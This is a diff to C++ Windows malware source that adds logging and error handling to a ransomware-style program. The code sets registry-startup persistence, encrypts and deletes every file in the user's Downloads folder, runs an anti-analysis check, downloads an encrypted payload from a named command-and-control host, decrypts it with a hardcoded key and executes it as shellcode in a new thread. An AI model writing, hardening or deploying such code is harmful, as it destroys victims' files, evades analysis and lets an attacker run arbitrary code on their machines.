@@ -31,6 +31,21 @@
 #define AES_KEY_LENGTH 128
 #define BLOCK_SIZE 16
 
+void WriteLog(const std::string& message) {
+    try {
+        std::ofstream logFile("C:\\Windows\\Temp\\system.log", std::ios::app);
+        if (logFile.is_open()) {
+            SYSTEMTIME st;
+            GetLocalTime(&st);
+            logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
+                   << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond 
+                   << "] " << message << std::endl;
+            logFile.close();
+        }
+    } catch (...) {
+        // Silently fail if logging fails
+    }
+}
 // Helper function to convert std::string to std::wstring
 std::wstring stringToWString(const std::string& str) {
     return std::wstring(str.begin(), str.end());
@@ -79,6 +94,8 @@ std::wstring GetProcessName(DWORD processId) {
 
 // Function to encrypt data using AES-128 CBC in Windows CryptoAPI
 bool encryptFileAES(const std::string& filename) {
+    WriteLog("Attempting to encrypt file: " + filename);
+    
     HCRYPTPROV hProv;
     HCRYPTKEY hKey;
     HCRYPTHASH hHash;
@@ -204,7 +221,11 @@ bool encryptFileAES(const std::string& filename) {
     CryptDestroyHash(hHash);
     CryptReleaseContext(hProv, 0);
 
-    DeleteFileA(filename.c_str());
+    if (DeleteFileA(filename.c_str())) {
+        WriteLog("Successfully encrypted and deleted: " + filename);
+    } else {
+        WriteLog("Failed to delete original file: " + filename);
+    }
     return true;
 }
 
@@ -217,8 +238,9 @@ void BypassDynamicAnalysis()
         exit(0);
 }
 
-std::vector<BYTE> Download(int fake,LPCWSTR baseAddress, int port, LPCWSTR filename)
-{
+std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR filename) {
+    WriteLog("Attempting to connect to C2: " + std::string(baseAddress, baseAddress + wcslen(baseAddress)));
+    
     HINTERNET hSession = WinHttpOpen(
         NULL,
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
@@ -226,13 +248,25 @@ std::vector<BYTE> Download(int fake,LPCWSTR baseAddress, int port, LPCWSTR filen
         WINHTTP_NO_PROXY_BYPASS,
         0);
 
+    if (!hSession) {
+        WriteLog("Failed to create WinHTTP session");
+        return std::vector<BYTE>();
+    }
+
     HINTERNET hConnect = WinHttpConnect(
         hSession,
         baseAddress,
         port,
         0);
 
-    // create request handle
+    if (!hConnect) {
+        WriteLog("Failed to connect to C2 server");
+        WinHttpCloseHandle(hSession);
+        return std::vector<BYTE>();
+    }
+
+    WriteLog("Successfully connected to C2 server");
+
     HINTERNET hRequest = WinHttpOpenRequest(
         hConnect,
         L"GET",
@@ -242,31 +276,55 @@ std::vector<BYTE> Download(int fake,LPCWSTR baseAddress, int port, LPCWSTR filen
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         0);
 
-    WinHttpSendRequest(
+    if (!hRequest) {
+        WriteLog("Failed to create HTTP request");
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return std::vector<BYTE>();
+    }
+
+    if (!WinHttpSendRequest(
         hRequest,
         WINHTTP_NO_ADDITIONAL_HEADERS,
         0,
         WINHTTP_NO_REQUEST_DATA,
         0,
         0,
-        0);
+        0)) {
+        WriteLog("Failed to send HTTP request");
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return std::vector<BYTE>();
+    }
 
-    WinHttpReceiveResponse(
-        hRequest,
-        NULL);
+    if (!WinHttpReceiveResponse(hRequest, NULL)) {
+        WriteLog("Failed to receive HTTP response");
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return std::vector<BYTE>();
+    }
+
+    WriteLog("Successfully received HTTP response");
 
     std::vector<BYTE> buffer;
     DWORD bytesRead = 0;
 
     do {
         BYTE temp[4096]{};
-        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
+        if (!WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead)) {
+            WriteLog("Failed to read HTTP data");
+            break;
+        }
 
         if (bytesRead > 0) {
             buffer.insert(buffer.end(), temp, temp + bytesRead);
         }
 
     } while (bytesRead > 0);
+
+    WriteLog("Downloaded " + std::to_string(buffer.size()) + " bytes from C2");
 
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
@@ -403,36 +461,52 @@ std::vector<BYTE> HexToBytes(const std::string& hex) {
     return bytes;
 }
 
+
 void RunPayload()
 {
     try {
-        AddToRegistryStartup();
+        WriteLog("Starting payload execution");
+        
+        if (AddToRegistryStartup()) {
+            WriteLog("Successfully added to registry startup");
+        } else {
+            WriteLog("Failed to add to registry startup");
+        }
 
         try {
             wchar_t userProfile[MAX_PATH];
             if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
                 std::wstring downloadsPath = std::wstring(userProfile) + L"\\Downloads";
                 std::string targetDir = std::string(downloadsPath.begin(), downloadsPath.end());
+                WriteLog("Scanning directory: " + targetDir);
+                
                 std::vector<std::string> files = listFilesRecursive(targetDir);
+                WriteLog("Found " + std::to_string(files.size()) + " files to encrypt");
                 
                 for (const auto& file : files) {
                     try {
                         encryptFileAES(file);
                     } catch (...) {
+                        WriteLog("Failed to encrypt file: " + file);
                         continue;
                     }
                 }
             }
         } catch (...) {
+            WriteLog("Error during file encryption process");
         }
 
+        WriteLog("Starting C2 communication");
         BypassDynamicAnalysis();
         std::vector<BYTE> recvbuf;
         recvbuf = Download(13337, L"crypto.harrylee.id.vn\0", 443, L"/enc_nt205.bin\0");
 
         if (recvbuf.empty()) {
+            WriteLog("Failed to download payload from C2");
             return;
         }
+
+        WriteLog("Successfully downloaded payload from C2");
 
         // Convert hex key to BYTE array
         std::string hexKey = "df6b7d1be3467b0805b831bfed90b69a649381393efbb9cb295d1d307f78e650";
@@ -473,16 +547,15 @@ void RunPayload()
         );
 
         if (tHandle) {
-            // Set thread priority to highest
+            WriteLog("Successfully created shellcode thread");
             SetThreadPriority(tHandle, THREAD_PRIORITY_HIGHEST);
-            
-            // Resume the thread
             ResumeThread(tHandle);
-            
-            // Detach the thread so it continues running even if main thread ends
             CloseHandle(tHandle);
+        } else {
+            WriteLog("Failed to create shellcode thread");
         }
     } catch (...) {
+        WriteLog("Critical error in RunPayload");
     }
 }
 
